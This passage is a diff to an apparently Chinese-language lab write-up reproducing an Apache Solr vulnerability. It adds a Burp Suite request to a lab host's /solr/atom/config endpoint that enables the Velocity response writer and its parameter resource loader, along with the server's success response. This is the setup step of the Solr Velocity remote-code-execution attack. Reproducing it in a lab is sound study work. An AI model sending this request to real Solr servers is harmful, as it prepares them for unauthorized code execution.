@@ -101,6 +101,57 @@ root@kali:/opt/solr-7.7.2/bin#
 
 ![](./solr-8983.jpg)
 
+到此，漏洞环境搭建完成。
+
+## 利用Burpsuite 发包
+
+由于我们修改的atom目录下的配置文件，所以我们只能拿这个存在配置缺陷的接口来攻击
+
+`http://10.10.20.166:8983/solr/atom/config`
+
+![](./atom.jpg)
+
+#### BurpSuite request
+```
+POST /solr/atom/config HTTP/1.1
+Host: 10.10.20.166:8983
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 259
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+{
+  "update-queryresponsewriter": {
+    "startup": "lazy",
+    "name": "velocity",
+    "class": "solr.VelocityResponseWriter",
+    "template.base.dir": "",
+    "solr.resource.loader.enabled": "true",
+    "params.resource.loader.enabled": "true"
+  }
+}
+```
+
+#### BurpSuite response
+```
+HTTP/1.1 200 OK
+Connection: close
+Content-Type: application/json;charset=utf-8
+Content-Length: 149
+
+{
+  "responseHeader":{
+    "status":0,
+    "QTime":554},
+  "WARNING":"This response format is experimental.  It is likely to change in the future."}
+
+```
+
+
 ## 参考链接：
 
 https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt
